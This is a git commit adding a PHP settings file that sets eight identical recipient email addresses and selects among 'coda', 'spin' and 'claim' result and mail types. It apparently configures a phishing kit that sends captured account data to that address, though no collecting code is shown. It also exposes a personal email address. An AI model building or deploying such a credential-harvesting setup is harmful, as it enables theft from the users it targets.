d2f78734117d912fde4e8c2b4f3aa3f17fee961f
nabilakecebet99 <157259716+nabilakecebet99@users.noreply.github.com>
2024-03-09 07:36:11 +0700

    Add files via upload

---
+++ setting.php
@@ -0,0 +1,12 @@
+<?php
+$email1 = 'satriazenn@gmail.com';
+$email2 = 'satriazenn@gmail.com';
+$email3 = 'satriazenn@gmail.com';
+$email4 = 'satriazenn@gmail.com';
+$email5 = 'satriazenn@gmail.com';
+$email6 = 'satriazenn@gmail.com';
+$email7 = 'satriazenn@gmail.com';
+$email8 = 'satriazenn@gmail.com';
+$jenisress = $coda; //$coda, $spin, $claim
+$jenismail = $coda_mail; //$coda_mail, $spin_mail, $claim_mail
+?>
